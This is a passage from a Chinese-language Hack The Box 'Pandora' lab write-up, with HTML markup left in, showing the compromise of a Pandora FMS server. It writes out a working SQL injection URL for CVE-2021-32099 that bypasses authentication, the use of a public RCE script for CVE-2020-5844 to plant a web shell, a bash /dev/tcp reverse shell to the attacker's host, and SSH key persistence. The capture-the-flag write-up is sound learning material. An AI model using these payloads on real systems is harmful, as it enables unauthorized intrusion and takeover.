class="hljs-variable">$&#123;MYSQL_ENV_MYSQL_DATABASE:-pandora&#125;</span>&#125;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PANDORA_DB_PASSWORD</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;error: missing required PANDORA_DB_PASSWORD environment variable&#x27;</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;  Did you forget to -e PANDORA_DB_PASSWORD=... ?&#x27;</span><br>        <span class="hljs-built_in">echo</span> &gt;&amp;2<br>        <span class="hljs-built_in">echo</span> &gt;&amp;2 <span class="hljs-string">&#x27;  (Also of interest might be PANDORA_DB_USER and PANDORA_DB_NAME.)&#x27;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">mv</span> -f /tmp/pandorafms/pandora_console /var/www/html<br><span class="hljs-built_in">cd</span> /var/www/html/pandora_console/include<br><span class="hljs-built_in">cat</span> &gt; config.php &lt;&lt;- <span class="hljs-string">&#x27;EOF&#x27;</span><br>&lt;?php<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&quot;dbtype&quot;</span>] = <span class="hljs-string">&quot;mysql&quot;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&quot;homedir&quot;</span>]=<span class="hljs-string">&quot;/var/www/html/pandora_console&quot;</span>;             // Config homedir<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&quot;homeurl&quot;</span>]=<span class="hljs-string">&quot;/pandora_console&quot;</span>;                  // Base URL<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&quot;homeurl_static&quot;</span>]=<span class="hljs-string">&quot;/pandora_console&quot;</span>;                   // Don<span class="hljs-string">&#x27;t  delete</span><br><span class="hljs-string">error_reporting(E_ALL);</span><br><span class="hljs-string">$ownDir = dirname(__FILE__) . DIRECTORY_SEPARATOR;</span><br><span class="hljs-string">EOF</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &quot;\$config[\&quot;dbname\&quot;]=\&quot;$PANDORA_DB_NAME\&quot;;&quot; &gt;&gt; config.php</span><br><span class="hljs-string">echo &quot;\$config[\&quot;dbuser\&quot;]=\&quot;$PANDORA_DB_USER\&quot;;&quot; &gt;&gt; config.php</span><br><span class="hljs-string">echo &quot;\$config[\&quot;dbpass\&quot;]=\&quot;$PANDORA_DB_PASSWORD\&quot;;&quot; &gt;&gt; config.php</span><br><span class="hljs-string">echo &quot;\$config[\&quot;dbhost\&quot;]=\&quot;$PANDORA_DB_HOST\&quot;;&quot; &gt;&gt; config.php</span><br><span class="hljs-string">echo &quot;include (\$ownDir . \&quot;config_process.php\&quot;);&quot; &gt;&gt; config.php</span><br><span class="hljs-string">echo &quot;?&gt;&quot; &gt;&gt; config.php</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &quot;Granting apache permissions to the console directory&quot;</span><br><span class="hljs-string">chown -R apache:apache /var/www/html/pandora_console</span><br><span class="hljs-string">chmod 600 /var/www/html/pandora_console/include/config.php</span><br><span class="hljs-string"></span><br><span class="hljs-string"># Customize php.iniA</span><br><span class="hljs-string">echo &quot;Configuring Pandora FMS elements and depending services&quot;</span><br><span class="hljs-string">sed &quot;s/.*error_reporting =.*/error_reporting = E_ALL \&amp; \~E_DEPRECATED \&amp; \~E_NOTICE \&amp; \~E_USER_WARNING/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string">sed &quot;s/.*max_execution_time =.*/max_execution_time = 0/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string">sed &quot;s/.*max_input_time =.*/max_input_time = -1/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string">sed &quot;s/.*upload_max_filesize =.*/upload_max_filesize = 800M/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string">sed &quot;s/.*memory_limit =.*/memory_limit = 500M/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string">sed &quot;s/.*post_max_size =.*/post_max_size = 100M/&quot; /etc/php.ini &gt; /tmp/php.ini &amp;&amp; mv /tmp/php.ini /etc/php.ini</span><br><span class="hljs-string"></span><br><span class="hljs-string">cd /var/www/html/pandora_console &amp;&amp; mv -f install.php install.php.done</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Create the pandora user</span><br><span class="hljs-string">/usr/sbin/useradd -d /home/pandora -s /bin/false -M -g 0 pandora</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Rock n&#x27;</span> roll!<br>/etc/init.d/crond start &amp;<br>/etc/init.d/ntpd start &amp;<br><br><span class="hljs-built_in">rm</span> -rf /run/httpd/*<br><span class="hljs-built_in">exec</span> /usr/sbin/apachectl -D FOREGROUND<br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/include/con<br>config.inc.php      config.php          config_process.php  constants.php       <br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/include/config.<br>config.inc.php  config.php      <br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /var/www/pandora/pandora_console/include/config.php <br><span class="hljs-built_in">cat</span>: /var/www/pandora/pandora_console/include/config.php: Permission denied<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -la /var/www/pandora/pandora_console/include/<br>total 4184<br>drwxr-xr-x 21 matt matt   4096 Dec  7  2021 .<br>drwxr-xr-x 16 matt matt   4096 Dec  7  2021 ..<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 ajax<br>-rw-r--r--  1 matt matt  10817 Jan  3  2020 api.php<br>drwxr-xr-x  3 matt matt   4096 Dec  7  2021 auth<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 browscap<br>-rw-r--r--  1 matt matt  83565 May 17  2019 calendar.js<br>-rw-r--r--  1 matt matt  11133 Jan  3  2020 chart_generator.php<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 class<br>-rw-r--r--  1 matt matt   1208 Jan  3  2020 config.inc.php<br>-rw-------  1 matt matt    413 Dec  3  2021 config.php<br>-rw-r--r--  1 matt matt   9455 Jan  3  2020 config_process.php<br>-rw-r--r--  1 matt matt  20304 Jan  3  2020 constants.php<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 db<br>drwxr-xr-x  5 matt matt   4096 Dec  7  2021 ehorus<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 fonts<br>-rw-r--r--  1 matt matt 103508 Jan  3  2020 functions_agents.php<br>-rw-r--r--  1 matt matt  74014 Jan  3  2020 functions_alerts.php<br>-rw-r--r--  1 matt matt 533199 Jan  3  2020 functions_api.php<br>-rw-r--r--  1 matt matt   2268 Jan  3  2020 functions_categories.php<br>-rw-r--r--  1 matt matt   8790 Jan  3  2020 functions_clippy.php<br>-rw-r--r--  1 matt matt   2354 Jan  3  2020 functions_component_groups.php<br>-rw-r--r--  1 matt matt 125584 Jan  3  2020 functions_config.php<br>-rw-r--r--  1 matt matt  11772 Jan  3  2020 functions_container.php<br>-rw-r--r--  1 matt matt   1296 Jan  3  2020 functions_credential_store.php<br>-rw-r--r--  1 matt matt  24900 Jan  3  2020 functions_cron.php<br>-rw-r--r--  1 matt matt  30834 Jan  3  2020 functions_custom_fields.php<br>-rw-r--r--  1 matt matt   6141 Jan  3  2020 functions_custom_graphs.php<br>-rw-r--r--  1 matt matt  62274 Jan  3  2020 functions_db.php<br>-rw-r--r--  1 matt matt   2264 Jan  3  2020 functions_event_responses.php<br>-rw-r--r--  1 matt matt 203093 Jan  3  2020 functions_events.php<br>-rw-r--r--  1 matt matt 201815 Jan  3  2020 functions_events.php.orig<br>-rw-r--r--  1 matt matt   2409 Jan  3  2020 functions_exportserver.php<br>-rw-r--r--  1 matt matt  16339 Jan  3  2020 functions_extensions.php<br>-rw-r--r--  1 matt matt  34154 Jan  3  2020 functions_filemanager.php<br>-rw-r--r--  1 matt matt   7919 Jan  3  2020 functions_forecast.php<br>-rw-r--r--  1 matt matt  55389 Jan  3  2020 functions_gis.php<br>-rw-r--r--  1 matt matt 168692 Jan  3  2020 functions_graph.php<br>-rw-r--r--  1 matt matt  92604 Jan  3  2020 functions_groups.php<br>-rw-r--r--  1 matt matt   7988 Jan  3  2020 functions_groupview.php<br>-rw-r--r--  1 matt matt 116612 Jan  3  2020 functions_html.php<br>-rw-r--r--  1 matt matt  12608 Jan  3  2020 functions_incidents.php<br>-rw-r--r--  1 matt matt  12627 Jan  3  2020 functions_integriaims.php<br>-rw-r--r--  1 matt matt  15493 Jan  3  2020 functions_io.php<br>-rw-r--r--  1 matt matt  12782 Jan  3  2020 functions_maps.php<br>-rw-r--r--  1 matt matt  27255 Jan  3  2020 functions_menu.php<br>-rw-r--r--  1 matt matt  17310 Jan  3  2020 functions_messages.php<br>-rw-r--r--  1 matt matt   4058 Jan  3  2020 functions_migration.php<br>-rw-r--r--  1 matt matt  95770 Jan  3  2020 functions_modules.php<br>-rw-r--r--  1 matt matt  51687 Jan  3  2020 functions_netflow.php<br>-rw-r--r--  1 matt matt  16692 Jan  3  2020 functions_network_components.php<br>-rw-r--r--  1 matt matt  73983 Jan  3  2020 functions_networkmap.php<br>-rw-r--r--  1 matt matt   1229 Jan  3  2020 functions_networkmaps.php<br>-rw-r--r--  1 matt matt   8151 Jan  3  2020 functions_network.php<br>-rw-r--r--  1 matt matt   2230 Jan  3  2020 functions_network_profiles.php<br>-rw-r--r--  1 matt matt  27613 Jan  3  2020 functions_notifications.php<br>-rw-r--r--  1 matt matt   2361 Jan  3  2020 functions_os.php<br>-rw-r--r--  1 matt matt   1229 Jan  3  2020 functions_pandora_networkmap.php<br>-rw-r--r--  1 matt matt 154858 Jan  3  2020 functions.php<br>-rw-r--r--  1 matt matt  35615 Jan  3  2020 functions_planned_downtimes.php<br>-rw-r--r--  1 matt matt   2148 Jan  3  2020 functions_post_process.php<br>-rw-r--r--  1 matt matt   9110 Jan  3  2020 functions_profile.php<br>-rw-r--r--  1 matt matt 181908 Jan  3  2020 functions_reporting_html.php<br>-rw-r--r--  1 matt matt 418051 Jan  3  2020 functions_reporting.php<br>-rw-r--r--  1 matt matt   2381 Jan  3  2020 functions_reporting_xml.php<br>-rw-r--r--  1 matt matt  23179 Jan  3  2020 functions_reports.php<br>-rw-r--r--  1 matt matt  40701 Jan  3  2020 functions_servers.php<br>-rw-r--r--  1 matt matt  32871 Jan  3  2020 functions_snmp_browser.php<br>-rw-r--r--  1 matt matt  12954 Jan  3  2020 functions_snmp.php<br>-rw-r--r--  1 matt matt  18055 Jan  3  2020 functions_tactical.php<br>-rw-r--r--  1 matt matt  81748 Jan  3  2020 functions_tags.php<br>-rw-r--r--  1 matt matt   2040 Jan  3  2020 functions_themes.php<br>-rw-r--r--  1 matt matt  31058 Jan  3  2020 functions_treeview.php<br>-rw-r--r--  1 matt matt 182399 Jan  3  2020 functions_ui.php<br>-rw-r--r--  1 matt matt   3871 Jan  3  2020 functions_ui_renders.php<br>-rw-r--r--  1 matt matt  60177 Jan  3  2020 functions_update_manager.php<br>-rw-r--r--  1 matt matt  33529 Dec  2  2021 functions_users.php<br>-rw-r--r--  1 matt matt  65797 Jan  3  2020 functions_visual_map_editor.php<br>-rw-r--r--  1 matt matt 173714 Jan  3  2020 functions_visual_map.php<br>-rw-r--r--  1 matt matt   7910 Jan  3  2020 functions_wmi.php<br>-rw-r--r--  1 matt matt   2098 Jan  3  2020 get_file.php<br>-rw-r--r--  1 matt matt   9272 Jan  3  2020 gettext.php<br>drwxr-xr-x  4 matt matt   4096 Dec  7  2021 graphs<br>drwxr-xr-x  6 matt matt   4096 Dec  7  2021 <span class="hljs-built_in">help</span><br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 ics-parser<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 Image<br>-rw-r--r--  1 matt matt   1322 Jan  3  2020 include_graph_dependencies.php<br>drwxr-xr-x  8 matt matt   4096 Dec  7  2021 javascript<br>drwxr-xr-x  3 matt matt   4096 Dec  7  2021 languages<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 lib<br>-rw-r--r--  1 matt matt   4842 Jan  3  2020 load_session.php<br>-rw-r--r--  1 matt matt   1177 Jan  3  2020 php_to_js_values.php<br>drwxr-xr-x  3 matt matt   4096 Dec  7  2021 rest-api<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 sounds<br>-rw-r--r--  1 matt matt   6152 May 17  2019 streams.php<br>drwxr-xr-x  4 matt matt   4096 Dec  7  2021 styles<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 templates<br>-rw-r--r--  1 matt matt    637 Jan  3  2020 test.js<br>drwxr-xr-x  2 matt matt   4096 Dec  7  2021 visual-console-client<br>-rw-r--r--  1 matt matt   2640 Jan  3  2020 web2image.js<br>-rw-r--r--  1 matt matt   5523 Jan  3  2020 websocket_registrations.php<br>daniel@pandora:~$ <span class="hljs-built_in">ls</span> -lah /etc/apache2/sites-available/<br>total 24K<br>drwxr-xr-x 2 root root 4.0K Dec  7  2021 .<br>drwxr-xr-x 8 root root 4.0K Dec  7  2021 ..<br>-rw-r--r-- 1 root root 1.4K Apr 13  2020 000-default.conf<br>-rw-r--r-- 1 root root 6.2K Apr 13  2020 default-ssl.conf<br>-rw-r--r-- 1 root root  315 Dec  3  2021 pandora.conf<br>daniel@pandora:~$ <span class="hljs-built_in">cat</span> /etc/apache2/sites-available/pandora.conf<br>&lt;VirtualHost localhost:80&gt;<br>  ServerAdmin admin@panda.htb<br>  ServerName pandora.panda.htb<br>  DocumentRoot /var/www/pandora<br>  AssignUserID matt matt<br>  &lt;Directory /var/www/pandora&gt;<br>    AllowOverride All<br>  &lt;/Directory&gt;<br>  ErrorLog /var/log/apache2/error.log<br>  CustomLog /var/log/apache2/access.log combined<br>&lt;/VirtualHost&gt;<br>daniel@pandora:~$ curl http://localhost/<br>&lt;meta HTTP-EQUIV=<span class="hljs-string">&quot;REFRESH&quot;</span> content=<span class="hljs-string">&quot;0; url=/pandora_console/&quot;</span>&gt;<br>daniel@pandora:~$ find /var/www/pandora/ -writable<br>daniel@pandora:~$ <br></code></pre></td></tr></table></figure>

<p>15、然后并没有什么收获，唯一的是发现了配置文件里好像，本地还有一个80端口的服务，这里使用ss再确认下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">daniel@pandora:~$ ss -ltn<br>State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process            <br>LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                  <br>LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*                                  <br>LISTEN            0                 80                               127.0.0.1:3306                             0.0.0.0:*                                  <br>LISTEN            0                 511                                      *:80                                     *:*                                  <br>LISTEN            0                 128                                   [::]:22                                  [::]:*                                  <br>daniel@pandora:~$ <br></code></pre></td></tr></table></figure>

<p>16、那就使用ssh进行转发出来吧，看看这个网站</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh -L 80:127.0.0.1:80 daniel@10.10.11.136            <br><br>daniel@10.10.11.136<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Wed 27 Dec 03:26:41 UTC 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:           0.0</span><br><span class="hljs-string">  Usage of /:            63.1% of 4.87GB</span><br><span class="hljs-string">  Memory usage:          9%</span><br><span class="hljs-string">  Swap usage:            0%</span><br><span class="hljs-string">  Processes:             226</span><br><span class="hljs-string">  Users logged in:       1</span><br><span class="hljs-string">  IPv4 address for eth0: 10.10.11.136</span><br><span class="hljs-string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:af3</span><br><span class="hljs-string"></span><br><span class="hljs-string">  =&gt; /boot is using 91.8% of 219MB</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Wed Dec 27 03:13:18 2023 from 10.10.14.3</span><br><span class="hljs-string">daniel@pandora:~$ </span><br></code></pre></td></tr></table></figure>

<p>17、然后本机看一下这个网站信息</p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p>18、通过检索，我们发现了以下的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Pandora FMS<br><br>v7.0NG.742_FIX_PERL2020<br></code></pre></td></tr></table></figure>

<p>19、这里使用谷歌进行搜集相关的漏洞信息</p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>20、发现了一些漏洞信息情况</p>
<p><code>exploit-CVE-2020-5844</code></p>
<p><code>index.php?sec=godmode/extensions&amp;sec2=extensions/files_repo在 Pandora FMS v7.0 NG 中，经过身份验证的管理员可以上传恶意 PHP 脚本，并通过文件位置的 Base64 解码来执行它们。这会影响v7.0NG.742_FIX_PERL2020.</code></p>
<p><code>https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/</code></p>
<p><code>在分析Pandora FMS 742控制台时，我们发现了以下代码漏洞：</code></p>
<p><code>SQL 注入（预身份验证）(CVE-2021-32099)</code><br><code>Phar 反序列化（预身份验证）(CVE-2021-32098)</code><br><code>远程文件包含（最低权限用户）(CVE-2021-32100)</code><br><code>跨站请求伪造 (CSRF)</code></p>
<p><code>https://sploitus.com/exploit?id=100B9151-5B50-532E-BF69-74864F32DB02</code></p>
<p><code>https://github.com/l3eol3eo/CVE-2021-32099_SQLi</code></p>
<p><code>POC:</code><br><code>http://localhost:80/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a =&gt; Pandora FMS Graph ( - )</code></p>
<p><code>reload: http://localhost:8000/pandora_console/ to access webpage</code></p>
<p>21、这里我们采用了 CVE-2021-32099_SQLi 漏洞，直接登录到网站后台了</p>
<p><code>http://localhost:80/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a</code></p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://localhost:8000/pandora_console/</code></p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>22、可以看到我们进入到了网站后台页面，但是还是需要继续漏洞利用，这里想开了一开始我们通过百度检索发现的 CVE-2020-5844 漏洞，而该漏洞需要一个漏洞利用脚本，我们在 searchsploit 中就有这个利用脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit Pandora FMS 7.0 NG 742<br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                           |  Path<br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)                                                     | php/webapps/50961.py<br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>

<p>23、这里进行下载尝试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m php/webapps/50961.py <br>  Exploit: Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)<br>      URL: https://www.exploit-db.com/exploits/50961<br>     Path: /usr/share/exploitdb/exploits/php/webapps/50961.py<br>    Codes: CVE-2020-5844<br> Verified: False<br>File Type: Python script, ASCII text executable, with very long lines (1384)<br>Copied to: /home/kali/桌面/50961.py<br></code></pre></td></tr></table></figure>

<p>24、尝试运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 50961.py                                                <br>UNICORD Exploit <span class="hljs-keyword">for</span> CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution<br><br>Usage:<br>  python3 exploit-CVE-2020-5844.py -t &lt;target-IP&gt; &lt;target-port&gt; -u &lt;username&gt; &lt;password&gt;<br>  python3 exploit-CVE-2020-5844.py -t &lt;target-IP&gt; &lt;target-port&gt; -p &lt;PHPSESSID&gt;<br>  python3 exploit-CVE-2020-5844.py -t &lt;target-IP&gt; &lt;target-port&gt; -p &lt;PHPSESSID&gt; [-c &lt;custom-command&gt;]<br>  python3 exploit-CVE-2020-5844.py -t &lt;target-IP&gt; &lt;target-port&gt; -p &lt;PHPSESSID&gt; [-s &lt;local-ip&gt; &lt;local-port&gt;]<br>  python3 exploit-CVE-2020-5844.py -t &lt;target-IP&gt; &lt;target-port&gt; -p &lt;PHPSESSID&gt; [-w &lt;name.php&gt;]<br>  python3 exploit-CVE-2020-5844.py -h<br><br>Options:<br>  -t    Target host and port. Provide target IP address and port.<br>  -u    Target username and password. Provide username and password to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> to Pandora FMS.<br>  -p    Target valid PHP session ID. No username or password needed. (Optional)<br>  -s    Reverse shell mode. Provide <span class="hljs-built_in">local</span> IP address and port. (Optional)<br>  -c    Custom <span class="hljs-built_in">command</span> mode. Provide <span class="hljs-built_in">command</span> to execute. (Optional)<br>  -w    Web shell custom mode. Provide custom PHP file name. (Optional)<br>  -h    Show this <span class="hljs-built_in">help</span> menu.<br></code></pre></td></tr></table></figure>

<p>23、这里需要使用下获取下cookie信息</p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p><code>07ginjuage5gp37lqlualmfpah</code></p>
<p>24、然后我们开始执行命令，上传一个WEBshell吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 50961.py -t 127.0.0.1 80 -p 07ginjuage5gp37lqlualmfpah <br>        _ __,~~~/_        __  ___  _______________  ___  ___<br>    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \<br>        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /<br>_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....<br>    <br>UNICORD: Exploit <span class="hljs-keyword">for</span> CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution<br>OPTIONS: Web Shell Mode<br>PHPSESS: 07ginjuage5gp37lqlualmfpah<br>WEBFILE: unicord.php<br>WEBSITE: http://127.0.0.1:80/pandora_console<br>EXPLOIT: Connected to website! Status Code: 200<br>EXPLOIT: Logged into Pandora FMS!<br>EXPLOIT: Web shell uploaded!<br>SUCCESS: Web shell available at: http://127.0.0.1:80/pandora_console/images/unicord.php?cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>

<p>25、这里可以看出来已经成功获取到一个网站的webshell 了，接下来就是构造反弹shell代码，进行获取交互式shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">访问地址：<br>127.0.0.1/pandora_console/images/unicord.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.3%2F10086%200%3E%261%22<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p>26、成功获取到监听，并读取到第一个flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.3] from (UNKNOWN) [10.10.11.136] 34152<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (937): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>matt@pandora:/var/www/pandora/pandora_console/images$ <br><br>matt@pandora:/var/www/pandora/pandora_console/images$ <span class="hljs-built_in">cat</span> /home/matt/user.txt<br><span class="hljs-built_in">cat</span> /home/matt/user.txt<br>3b035facfdc16f5a6f5414e27d851381<br>matt@pandora:/var/www/pandora/pandora_console/images$ <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>27、为了方便我们进行后续操作，这里我们把本地的公钥放入到目标靶机的 matt 用户下进行使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:/var/www/pandora/pandora_console/images$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>matt@pandora:/home/matt$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>matt@pandora:/home/matt$ <span class="hljs-built_in">mkdir</span> .ssh<br><span class="hljs-built_in">mkdir</span> .ssh<br>matt@pandora:/home/matt$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ssh-rsa AAAAB3NKBQAEEmopirH5MZzROwVXA3 kali@kali&quot;</span> &gt; /home/matt/.ssh/authorized_keys<br>&lt;OwVXA3 kali@kali<span class="hljs-string">&quot; &gt; /home/matt/.ssh/authorized_keys</span><br><span class="hljs-string">matt@pandora:/home/matt$ </span><br></code></pre></td></tr></table></figure>

<p>28、使用ssh进行登录</p>
